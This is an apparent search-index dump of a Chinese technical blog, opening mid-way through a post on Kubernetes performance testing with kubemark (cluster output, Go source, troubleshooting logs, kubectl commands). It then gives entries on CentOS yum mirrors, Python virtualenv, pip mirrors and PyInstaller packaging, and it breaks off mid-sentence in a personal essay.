\u0026lt;none\u0026gt; kube-system calico-node-g6rqs 0/1 Init:0/1 0 14m 10.233.96.46 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-m55zq 0/1 Init:0/1 0 14m 10.233.96.47 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-ms5t6 1/1 Running 1 22h 192.168.182.102 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-n5528 0/1 Init:0/1 0 14m 10.233.96.50 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-njrr9 0/1 Init:0/1 0 14m 10.233.96.48 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-vxcb7 1/1 Running 1 22h 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-654c8ccdc8-575qx 1/1 Running 1 22h 10.233.90.76 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system coredns-654c8ccdc8-m8ntn 0/1 Pending 0 175d \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system dns-autoscaler-77445c9c8b-b565h 1/1 Running 1 22h 10.233.90.77 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-apiserver-node1 1/1 Running 12 22h 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-controller-manager-node1 1/1 Running 12 22h 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-dsghn 1/1 Running 1 22h 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-dzll2 0/1 ContainerCreating 0 14m 10.233.96.46 hollow-node-3 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-fqfqx 0/1 ContainerCreating 0 14m 10.233.96.51 hollow-node-1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-fxcs4 0/1 ContainerCreating 0 14m 10.233.96.50 hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-gjzq8 1/1 Running 1 22h 192.168.182.102 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-khv5c 0/1 ContainerCreating 0 14m 10.233.96.48 hollow-node-4 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-l7hzh 0/1 ContainerCreating 0 14m 10.233.96.49 hollow-node-5 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-proxy-r5lfv 0/1 ContainerCreating 0 14m 10.233.96.47 hollow-node-2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system kube-scheduler-node1 1/1 Running 12 22h 192.168.182.101 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system metrics-server-84d6dbd58b-sx7sl 0/2 ContainerCreating 0 14m \u0026lt;none\u0026gt; hollow-node-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-0 2/2 Running 0 14m 10.233.96.50 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-1 2/2 Running 0 14m 10.233.96.51 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-2 2/2 Running 0 14m 10.233.96.47 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-3 2/2 Running 0 14m 10.233.96.46 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-4 2/2 Running 0 14m 10.233.96.48 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kubemark hollow-node-5 2/2 Running 0 14m 10.233.96.49 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt;   说明： 网络插件和proxy组件的非running态，并不影响集群测试使用，比如proxy使用了\u0026ndash;use-real-proxier=false，并未使用真正的iptables\n测试pod调度到了hollow-node-3上，hollow-node-3节点信息如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  Name: hollow-node-3 Roles: \u0026lt;none\u0026gt; Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/arch=amd64 kubernetes.io/hostname=hollow-node-3 kubernetes.io/os=linux Annotations: node.alpha.kubernetes.io/ttl: 0 CreationTimestamp: Tue, 08 Dec 2020 13:34:35 +0800 Taints: \u0026lt;none\u0026gt; Unschedulable: false Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- MemoryPressure False Tue, 08 Dec 2020 13:49:06 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Tue, 08 Dec 2020 13:49:06 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletHasNoDiskPressure kubelet has no disk pressure PIDPressure False Tue, 08 Dec 2020 13:49:06 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletHasSufficientPID kubelet has sufficient PID available Ready True Tue, 08 Dec 2020 13:49:06 +0800 Tue, 08 Dec 2020 13:34:35 +0800 KubeletReady kubelet is posting ready status Addresses: InternalIP: 10.233.96.46 Hostname: hollow-node-3 Capacity: cpu: 72 ephemeral-storage: 15726578Mi inspur.com/gpu: 99999 inspur.com/rdma-hca: 99999 memory: 256Gi nvidia.com/gpu: 8 pods: 110 Allocatable: cpu: 72 ephemeral-storage: 15726578Mi inspur.com/gpu: 99999 inspur.com/rdma-hca: 99999 memory: 256Gi nvidia.com/gpu: 8 pods: 110 System Info: Machine ID: System UUID: Boot ID: Kernel Version: 3.16.0-0.bpo.4-amd64 OS Image: Debian GNU/Linux 7 (wheezy) Operating System: linux Architecture: amd64 Container Runtime Version: docker://1.13.1 Kubelet Version: v0.0.0-master+4d3c9e0c Kube-Proxy Version: v0.0.0-master+4d3c9e0c PodCIDR: 10.233.69.0/24 Non-terminated Pods: (3 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits AGE --------- ---- ------------ ---------- --------------- ------------- --- default myapp-pod 1 (1%) 1 (1%) 2Mi (0%) 2Mi (0%) 33s kube-system calico-node-g6rqs 150m (0%) 300m (0%) 64M (0%) 500M (0%) 14m kube-system kube-proxy-dzll2 0 (0%) 0 (0%) 0 (0%) 0 (0%) 14m Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) Resource Requests Limits -------- -------- ------ cpu 1150m (1%) 1300m (1%) memory 64548Ki (0%) 502097152 (0%) ephemeral-storage 0 (0%) 0 (0%) inspur.com/gpu 0 0 inspur.com/rdma-hca 0 0 nvidia.com/gpu 1 1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Starting 14m kube-proxy, hollow-node-3 Starting kube-proxy.   由上面测试集群信息，可以看到模拟了4个桩节点可用于测试pod调度。\nkubemark源码 程序入口 kubemark根据参数Morph，可执行kubelet和proxy流程，从而实现节点组件功能。\ncmd/kubemark/hollow-node.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  func run(config *hollowNodeConfig) { if !knownMorphs.Has(config.Morph) { klog.Fatalf(\u0026#34;Unknown morph: %v. Allowed values: %v\u0026#34;, config.Morph, knownMorphs.List()) } // create a client to communicate with API server.  clientConfig, err := config.createClientConfigFromFile() if err != nil { klog.Fatalf(\u0026#34;Failed to create a ClientConfig: %v. Exiting.\u0026#34;, err) } client, err := clientset.NewForConfig(clientConfig) if err != nil { klog.Fatalf(\u0026#34;Failed to create a ClientSet: %v. Exiting.\u0026#34;, err) } if config.Morph == \u0026#34;kubelet\u0026#34; { cadvisorInterface := \u0026amp;cadvisortest.Fake{ NodeName: config.NodeName, } containerManager := cm.NewStubContainerManager() fakeDockerClientConfig := \u0026amp;dockershim.ClientConfig{ DockerEndpoint: libdocker.FakeDockerEndpoint, EnableSleep: true, WithTraceDisabled: true, } hollowKubelet := kubemark.NewHollowKubelet( config.NodeName, client, cadvisorInterface, fakeDockerClientConfig, config.KubeletPort, config.KubeletReadOnlyPort, containerManager, maxPods, podsPerCore, ) hollowKubelet.Run() } if config.Morph == \u0026#34;proxy\u0026#34; { client, err := clientset.NewForConfig(clientConfig) if err != nil { klog.Fatalf(\u0026#34;Failed to create API Server client: %v\u0026#34;, err) } iptInterface := fakeiptables.NewFake() sysctl := fakesysctl.NewFake() execer := \u0026amp;fakeexec.FakeExec{} eventBroadcaster := record.NewBroadcaster() recorder := eventBroadcaster.NewRecorder(legacyscheme.Scheme, v1.EventSource{Component: \u0026#34;kube-proxy\u0026#34;, Host: config.NodeName}) hollowProxy, err := kubemark.NewHollowProxyOrDie( config.NodeName, client, client.CoreV1(), iptInterface, sysctl, execer, eventBroadcaster, recorder, config.UseRealProxier, config.ProxierSyncPeriod, config.ProxierMinSyncPeriod, ) if err != nil { klog.Fatalf(\u0026#34;Failed to create hollowProxy instance: %v\u0026#34;, err) } hollowProxy.Run() } }   hollow_kubelet pkg/kubemark/hollow_kubelet\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58  type HollowKubelet struct { KubeletFlags *options.KubeletFlags KubeletConfiguration *kubeletconfig.KubeletConfiguration KubeletDeps *kubelet.Dependencies } func NewHollowKubelet( nodeName string, client *clientset.Clientset, cadvisorInterface cadvisor.Interface, dockerClientConfig *dockershim.ClientConfig, kubeletPort, kubeletReadOnlyPort int, containerManager cm.ContainerManager, maxPods int, podsPerCore int, ) *HollowKubelet { // -----------------  // Static config  // -----------------  f, c := GetHollowKubeletConfig(nodeName, kubeletPort, kubeletReadOnlyPort, maxPods, podsPerCore) // -----------------  // Injected objects  // -----------------  volumePlugins := emptydir.ProbeVolumePlugins() volumePlugins = append(volumePlugins, secret.ProbeVolumePlugins()...) volumePlugins = append(volumePlugins, projected.ProbeVolumePlugins()...) d := \u0026amp;kubelet.Dependencies{ KubeClient: client, HeartbeatClient: client, DockerClientConfig: dockerClientConfig, CAdvisorInterface: cadvisorInterface, Cloud: nil, OSInterface: \u0026amp;containertest.FakeOS{}, ContainerManager: containerManager, VolumePlugins: volumePlugins, TLSOptions: nil, OOMAdjuster: oom.NewFakeOOMAdjuster(), Mounter: mount.New(\u0026#34;\u0026#34; /* default mount path */), Subpather: \u0026amp;subpath.FakeSubpath{}, } return \u0026amp;HollowKubelet{ KubeletFlags: f, KubeletConfiguration: c, KubeletDeps: d, } } // Starts this HollowKubelet and blocks. func (hk *HollowKubelet) Run() { if err := kubeletapp.RunKubelet(\u0026amp;options.KubeletServer{ KubeletFlags: *hk.KubeletFlags, KubeletConfiguration: *hk.KubeletConfiguration, }, hk.KubeletDeps, false); err != nil { klog.Fatalf(\u0026#34;Failed to run HollowKubelet: %v. Exiting.\u0026#34;, err) } select {} }   hollow_proxy pkg/kubemark/hollow_proxy\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  type HollowProxy struct { ProxyServer *proxyapp.ProxyServer } type FakeProxier struct{} func (*FakeProxier) Sync() {} func (*FakeProxier) SyncLoop() { select {} } func (*FakeProxier) OnServiceAdd(service *v1.Service) {} func (*FakeProxier) OnServiceUpdate(oldService, service *v1.Service) {} func (*FakeProxier) OnServiceDelete(service *v1.Service) {} func (*FakeProxier) OnServiceSynced() {} func (*FakeProxier) OnEndpointsAdd(endpoints *v1.Endpoints) {} func (*FakeProxier) OnEndpointsUpdate(oldEndpoints, endpoints *v1.Endpoints) {} func (*FakeProxier) OnEndpointsDelete(endpoints *v1.Endpoints) {} func (*FakeProxier) OnEndpointsSynced() {} func NewHollowProxyOrDie( nodeName string, client clientset.Interface, eventClient v1core.EventsGetter, iptInterface utiliptables.Interface, sysctl utilsysctl.Interface, execer utilexec.Interface, broadcaster record.EventBroadcaster, recorder record.EventRecorder, useRealProxier bool, proxierSyncPeriod time.Duration, proxierMinSyncPeriod time.Duration, ) (*HollowProxy, error) { // Create proxier and service/endpoint handlers.  var proxier proxy.ProxyProvider var serviceHandler proxyconfig.ServiceHandler var endpointsHandler proxyconfig.EndpointsHandler if useRealProxier { // Real proxier with fake iptables, sysctl, etc underneath it.  //var err error  proxierIPTables, err := iptables.NewProxier( iptInterface, sysctl, execer, proxierSyncPeriod, proxierMinSyncPeriod, false, 0, \u0026#34;10.0.0.0/8\u0026#34;, nodeName, utilnode.GetNodeIP(client, nodeName), recorder, nil, []string{}, ) if err != nil { return nil, fmt.Errorf(\u0026#34;unable to create proxier: %v\u0026#34;, err) } proxier = proxierIPTables serviceHandler = proxierIPTables endpointsHandler = proxierIPTables } else { proxier = \u0026amp;FakeProxier{} serviceHandler = \u0026amp;FakeProxier{} endpointsHandler = \u0026amp;FakeProxier{} } // Create a Hollow Proxy instance.  nodeRef := \u0026amp;v1.ObjectReference{ Kind: \u0026#34;Node\u0026#34;, Name: nodeName, UID: types.UID(nodeName), Namespace: \u0026#34;\u0026#34;, } return \u0026amp;HollowProxy{ ProxyServer: \u0026amp;proxyapp.ProxyServer{ Client: client, EventClient: eventClient, IptInterface: iptInterface, Proxier: proxier, Broadcaster: broadcaster, Recorder: recorder, ProxyMode: \u0026#34;fake\u0026#34;, NodeRef: nodeRef, OOMScoreAdj: utilpointer.Int32Ptr(0), ResourceContainer: \u0026#34;\u0026#34;, ConfigSyncPeriod: 30 * time.Second, ServiceEventHandler: serviceHandler, EndpointsEventHandler: endpointsHandler, }, }, nil } func (hp *HollowProxy) Run() { if err := hp.ProxyServer.Run(); err != nil { klog.Fatalf(\u0026#34;Error while running proxy: %v\\n\u0026#34;, err) } }   kubemark总结  kubemark实际上是个K8S组件，包含了kubelet和一个controller，模拟桩节点主要使用了kubelet功能。 kubemark通过在真实节点上构造批量的hollow-node的pod方式，模拟运行了大量的桩节点。这些桩节点可以定时跟master同步状态和信息。 kubemark一般用于测试master节点上的组件的性能测试，比如测试调度器和控制器组件性能。 kubemark由于其构造方式，决定其不能测试node节点组件，比如kubelet性能和网络等。  3 测试框架 可参考k8s的perf-test\n  Kubernetes测试系列 - 性能测试\n  kubernetes性能指标体系：clusterloader2\n  clusterloader2的漫漫踩坑路：最详细解析与使用指南\n  clusterloader2设计说明：Cluster loader vision\n  4 问题 kubemark的hollow node 启动后，报错： 此时node状态为为not ready\n1 2 3 4 5  I0223 04:37:53.577861 6 kubelet_node_status.go:468] Recording NodeHasSufficientPID event message for node hollow-node-1 I0223 04:37:53.577871 6 kubelet_node_status.go:468] Recording NodeNotReady event message for node hollow-node-1 I0223 04:37:53.577879 6 setters.go:526] Node became not ready: {Type:Ready Status:False LastHeartbeatTime:2021-02-23 04:37:53.577865902 +0000 UTC m=+46.268886946 LastTransitionTime:2021-02-23 04:37:53.577865902 +0000 UTC m=+46.268886946 Reason:KubeletNotReady Message:Missing node capacity for resources: pods} I0223 04:37:53.640378 6 reconciler.go:154] Reconciler: start to sync state   编译kubemark时，需要设置nodesstatus的maxpods数量 v1.ResourcePods: *resource.NewQuantity(maxpods, resource.DecimalSI)\n如果启动kubemark的hollow node 状态为not ready，查看log报错信息 1 2 3 4 5 6 7 8 9 10 11  E0223 06:15:30.382797 6 reflector.go:126] k8s.io/kubernetes/pkg/kubelet/config/apiserver.go:47: Failed to list *v1.Pod: Get \u0026#34;https://192.168.182.101:6443/api/v1/pods?fieldSelector=spec.nodeName%3Dhollow-node-0\u0026amp;limit=500\u0026amp;resourceVersion=0\u0026#34;: dial tcp 192.168.182.101:6443: i/o timeout I0223 06:15:30.383089 6 trace.go:81] Trace[432657393]: \u0026#34;Reflector k8s.io/kubernetes/pkg/kubelet/kubelet.go:451 ListAndWatch\u0026#34; (started: 2021-02-23 06:15:00.377839254 +0000 UTC m=+0.144897671) (total time: 30.005174003s): Trace[432657393]: [30.005174003s] [30.005174003s] END E0223 06:15:30.383123 6 reflector.go:126] k8s.io/kubernetes/pkg/kubelet/kubelet.go:451: Failed to list *v1.Node: Get \u0026#34;https://192.168.182.101:6443/api/v1/nodes?fieldSelector=metadata.name%3Dhollow-node-0\u0026amp;limit=500\u0026amp;resourceVersion=0\u0026#34;: dial tcp 192.168.182.101:6443: i/o timeout E0223 06:15:30.402640 6 kubelet.go:2246] node \u0026#34;hollow-node-0\u0026#34; not found E0223 06:15:30.502860 6 kubelet.go:2246] node \u0026#34;hollow-node-0\u0026#34; not found   此时可能为网络原因，停止kubelet和docker服务，清理下网络即可解决\n5 附录 参考操作命令。。。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  [root@test-master ~]# kubectl get secret -A |grep kubeconfig kubemark kubeconfig Opaque 2 94s [root@test-master ~]# kubectl describe secret -nkubemark kubeconfig Name: kubeconfig Namespace: kubemark Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; Type: Opaque Data ==== kubelet.kubeconfig: 5463 bytes kubeproxy.kubeconfig: 5463 bytes #### 如果要删除刚刚创建的secret和 configmap kubectl delete secret -nkubemark kubeconfig kubectl delete configmap -n kubemark node-configmap kubectl delete ns kubemark --force --grace-period=0 #### 强制删除资源 kubectl delete po --force --grace-period=0 -nkube-system kube-proxy-p6k42 ### 删除kubemark命名空间下所有node资源 kubectl delete no --all -n kubemark #### 设置master节点不可调度 # kubectl cordon nodename kubectl cordon node1 # kubectl uncordon nodename #取消 #### 节点打标签 kubectl label node node1 accessswitch=switch1 kubectl label node node1 groupId=defaultGroup kubectl label node node1 node-role.kubernetes.io/master=true kubectl label node node1 node-role.kubernetes.io/node=true kubectl label node node1 switchtype=ether kubectl label node node2 accessswitch=switch1 kubectl label node node2 groupId=defaultGroup kubectl label node node2 node-role.kubernetes.io/node=true kubectl label node node2 switchtype=ether   修改hollow-node信息，不是node的全部信息都可以修改更新，如capacity等字段无法更新\n1  kubectl patch node hollow-node-0 -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;unschedulable\u0026#34;:true}}\u0026#39;   e2e测试 编译e2e.test make WHAT=\u0026ldquo;test/e2e/e2e.test\u0026rdquo;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # 进入k8s项目，进行测试工具编译 make WHAT=\u0026#34;test/e2e/e2e.test\u0026#34; # 在目录下能够看到输出文件如下： [root@node1 k8s1.14.8modify-wangb]# ll _output/bin/ -h total 241M -rwxr-xr-x. 1 root root 5.9M Dec 7 10:04 conversion-gen -rwxr-xr-x. 1 root root 5.9M Dec 7 10:04 deepcopy-gen -rwxr-xr-x. 1 root root 5.9M Dec 7 10:04 defaulter-gen -rwxr-xr-x. 1 root root 110M Dec 7 17:01 e2e.test -rwxr-xr-x. 1 root root 3.5M Dec 7 10:04 go2make -rwxr-xr-x. 1 root root 2.0M Dec 7 10:04 go-bindata -rwxr-xr-x. 1 root root 99M Dec 7 10:05 kubemark -rwxr-xr-x. 1 root root 10M Dec 7 10:04 openapi-gen # 把 e2e.test 文件拷贝到测试集群的master节点上   需要注意：网上的搜到的文章大多数都是编译e2e的二进制文件直接运行\n1 2 3 4  #./e2e.test --kube-master=192.168.182.101 --host=https://192.168.182.101:6443 --ginkgo.focus=\u0026#34;\\[Performance\\]\u0026#34; --provider=local --kubeconfig=kubemark.kubeconfig --num-nodes=10 --v=3 --ginkgo.failFast --e2e-output-dir=. --report-dir=. ./e2e.test --kube-master=192.168.182.101 --host=https://192.168.182.101:6443 --ginkgo.focus=\u0026#34;\\[Performance\\]\u0026#34; --provider=local --kubeconfig=/root/.kube/config --num-nodes=4 --v=3 --ginkgo.failFast --e2e-output-dir=. --report-dir=.   但其实e2e的性能用例已经被移出主库了 https://github.com/kubernetes/kubernetes/pull/83322，所以在2019.10.1之后出的版本用上面的命令是无法运行性能测试的\nDeployment中pod创建的流程   apiserver收到创建deployment的请求，存储至etcd，告知controller-manager controller-manager创建pod的壳子，打上creationTimeStamp，发送请求到apiserver apiserver收到创建pod的请求，发送至etcd，推送到scheduler。 schduler选择node，填充nodeName，向apiserver更新pod信息。此时pod处于pending状态，pod也没有真正创建。 apiserver向etcd更新pod信息，同时推送到相应节点的kubelet kubelet创建pod，填充HostIP与resourceVersion，向apiserver发送更新请求，pod处于pending状态 apiserver更新pod信息至etcd，同时kubelet继续创建pod。等到容器都处于running状态，kubelet再次发送pod的更新请求给apiserver，此时pod running apiserver收到请求，更新到etcd中，并推送到informer中，informer记录下watchPhase    ","permalink":"http://bingerambo.com/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-kubemark/","tags":["K8S"],"title":"K8S集群性能测试-kubemark"},{"categories":["音乐"],"contents":"收集了一些经典好吹的口琴谱子，【持续更新。。。】\n布鲁斯口琴C调第1把位音阶图 送别 爱尔兰画眉 天空之城 星之所在 追梦人 平凡之路 喀秋莎 三套车 啊，朋友再见 The girl I left behind me 演奏视频地址\n","permalink":"http://bingerambo.com/posts/2018/09/%E5%8F%A3%E7%90%B4%E7%AE%80%E8%B0%B1%E9%9B%86/","tags":["音乐","口琴"],"title":"口琴简谱集"},{"categories":["Linux"],"contents":" 配置国内阿里yum源\n yum源配置步骤 根据官网的说明，分别有 CentOS 6、CentOS 7、CentOS 8等配置操作步骤。\n1. 备份操作 备份，将 CentOS-Base.repo 为CentOS-Base.repo.backup\n1  mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup   2. 下载yum源配置文件 下载新的 http://mirrors.aliyun.com/repo/Centos-7.repo，并命名为CentOS-Base.repo\n1  wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo   或者\n1  curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo   3. 清除缓存 1 2 3 4  # 清除系统所有的yum缓存 yum clean all # 生成yum缓存  yum makecache   epel源 安装和配置 1. 查看可用的epel源 1  yum list | grep epel-release   示例：\n1 2 3  [java@localhost yum.repos.d]$ yum list | grep epel-release epel-release.noarch 7-11 extras [java@localhost yum.repos.d]$   2. 安装 epel 1 2  yum install -y epel-release   3. 配置阿里镜像提供的epel源 1  wget -O /etc/yum.repos.d/epel-7.repo http://mirrors.aliyun.com/repo/epel-7.repo   或者\n1  curl -o /etc/yum.repos.d/epel-7.repo http://mirrors.aliyun.com/repo/epel-7.repo   4. 清除缓存 1 2 3 4  # 清除系统所有的yum缓存 yum clean all # 生成yum缓存  yum makecache   5. 其它命令 1 2 3 4 5 6 7  #查看所有的yum源： yum repolist all #查看可用的yum源： yum repolist enabled   ","permalink":"http://bingerambo.com/posts/2017/06/centos7%E5%88%87%E6%8D%A2%E5%9B%BD%E5%86%85yum%E6%BA%90/","tags":["Linux"],"title":"centos7切换国内yum源"},{"categories":["Python"],"contents":" 用 virtualenv 来管理多个开发环境，virtualenvwrapper 使得virtualenv变得更好用\n python虚拟环境搭建 1 2  # 安装虚拟环境 pip install virtualenv   安装配置  安装: (sudo) pip install virtualenv virtualenvwrapper Linux/Mac OSX 下：  修改~/.bash_profile或其它环境变量相关文件(如 .bashrc 或用 ZSH 之后的 .zshrc)，添加以下语句\n1 2 3 4 5 6  export WORKON_HOME=$HOME/.virtualenvs export PROJECT_HOME=$HOME/workspace source /usr/local/bin/virtualenvwrapper.sh #修改后使之立即生效(也可以重启终端使之生效)： source ~/.bash_profile   Windows 下：\n1  pip install virtualenvwrapper-win     1.设置环境变量\n 设置WORK_HOME环境变量：例如，WORK_HOME ： D:\\virtualenv    2.新建虚拟环境\n  1  mkvirtualenv virtualtest   注：因为前一步设置了WORK_HOME，所有虚拟环境将安装到 E:\\virtualenv\n 3.查看安装的所有虚拟环境  1  workon    使用方法： mkvirtualenv env_test：创建运行环境env_test  workon env_test: 工作在 env_test 环境 或 从其它环境切换到 env_test 环境\ndeactivate: 退出终端环境\n 其它的：  rmvirtualenv ENV：删除运行环境ENV\nmkproject mic：创建mic项目和运行环境mic\nmktmpenv：创建临时运行环境\nlsvirtualenv: 列出可用的运行环境\nlssitepackages: 列出当前环境安装了的包\n创建的环境是独立的，互不干扰\n  列出所有虚拟环境 lsvirtualenv\n  激活虚拟环境 workon venv   进入虚拟环境目录 cdvirtualenv\n  进入虚拟环境的site-packages目录 cdsitepackages\n  列出site-packages目录的所有软件包 lssitepackages\n  停止虚拟环境 deactivate\n  删除虚拟环境 rmvitualenv venv\n  重建Python环境  冻结环境  所谓 冻结(freeze) 环境，就是将当前环境的软件包等固定下来:\n1 2  # 安装包列表保存到文件packages.txt中 pip freeze \u0026gt;d:\\packages.txt　   重建环境  重建(rebuild) 环境就是在部署的时候，在生产环境安装好对应版本的软件包，不要出现版本兼容等问题:\n1  pip install -r d:\\packages.txt # 配合pip，可以批量安装对应版本的软件包，快速重建环境，完成部署。   ","permalink":"http://bingerambo.com/posts/2017/04/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","tags":["Python"],"title":"Python虚拟环境搭建"},{"categories":["Python"],"contents":"PIP安装：更换安装源，使用国内镜像。   对于Python开发用户来讲，经常使用PIP安装软件包。但是由于PIP默认安装源是在国外，经常出现下载后安装出错问题。所以把PIP安装源替换成国内镜像，可以大幅提升下载速度，还可以提高安装成功率。\n国内源： 新版ubuntu要求使用https源，要注意。\n清华：https://pypi.tuna.tsinghua.edu.cn/simple\n阿里云：http://mirrors.aliyun.com/pypi/simple/\n中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/\n华中理工大学：http://pypi.hustunique.com/\n山东理工大学：http://pypi.sdutlinux.org/\u0026nbsp;\n豆瓣：http://pypi.douban.com/simple/\n临时使用： 可以在使用pip的时候加参数-i http://pypi.douban.com/simple/ 例如：pip install -i http://pypi.douban.com/simple/ django，这样就会从豆瓣这边的镜像去安装django库。 \u0026nbsp;\n永久修改，一劳永逸： Linux下，修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹)\n内容如下：\n[global] index-url = https://pypi.douban.com/simple/\n [install] trusted-host=mirrors.aliyun.com  windows下，直接在user目录中创建一个pip目录，如：C:\\Users\\xx\\pip，新建文件pip.ini。内容同上。\n  ","permalink":"http://bingerambo.com/posts/2017/04/pip%E5%AE%89%E8%A3%85%E6%9B%B4%E6%8D%A2%E5%AE%89%E8%A3%85%E6%BA%90%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F/","tags":["Python"],"title":"PIP安装：更换安装源，使用国内镜像"},{"categories":["Python"],"contents":" 项目中有时会写些py脚本文件，为当作项目工具，方便无Python环境下使用，所以需要打包成exe文件。\n Python打包exe  Q：py生成exe，总共需几步？ A：总共分三步！  1. 安装PyInstaller 1  pip install PyInstaller    注意：安装包名区分大小写  2. 打包脚本:TargetPy2exe.py.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; @version: ?? @author: Binge @file: TargetPy2exe.py.py @time: 2017-02-07 11:21 @description: convert py to exe by pyinstaller \u0026#34;\u0026#34;\u0026#34; from PyInstaller.__main__ import run if __name__ == \u0026#39;__main__\u0026#39;: # 设置打包exe参数：目标py、打包参数 # -F 打包成一个exe文件 # -w 使用窗口，无控制台 # -c 使用控制台，无窗口 # --icon = 图标路径 # --upx-dir 使用upx压缩 # upx391w ups程序目录文件路径 # opts = [\u0026#39;tvn_process.py\u0026#39;, \u0026#39;-F\u0026#39;] opts = [\u0026#39;tvn_process.py\u0026#39;, \u0026#39;-F\u0026#39;, \u0026#39;-w\u0026#39;] # opts = [\u0026#39;tvn_process.py\u0026#39;, \u0026#39;-F\u0026#39;, \u0026#39;-c\u0026#39;] # opts = [\u0026#39;tvn_process.py\u0026#39;, \u0026#39;-F\u0026#39;, \u0026#39;-w\u0026#39;, \u0026#39;--upx-dir\u0026#39;, \u0026#39;upx391w\u0026#39;] # opts = [\u0026#39;tvn_process.py\u0026#39;, \u0026#39;-F\u0026#39;, \u0026#39;-w\u0026#39;,\u0026#39;--icon=tvn_process.ico\u0026#39;,\u0026#39;--upx-dir\u0026#39;,\u0026#39;upx391w\u0026#39;] run(opts)   3. 运行打包脚本，即可生成exe文件","permalink":"http://bingerambo.com/posts/2017/03/python%E5%A6%82%E4%BD%95%E6%89%93%E5%8C%85exe/","tags":["Python"],"title":"Python如何打包exe"},{"categories":["生活"],"contents":" “夕阳最美时，也总是将近黄昏。 世上有很多事都是这样子的，尤其是一些特别辉煌美好的事。 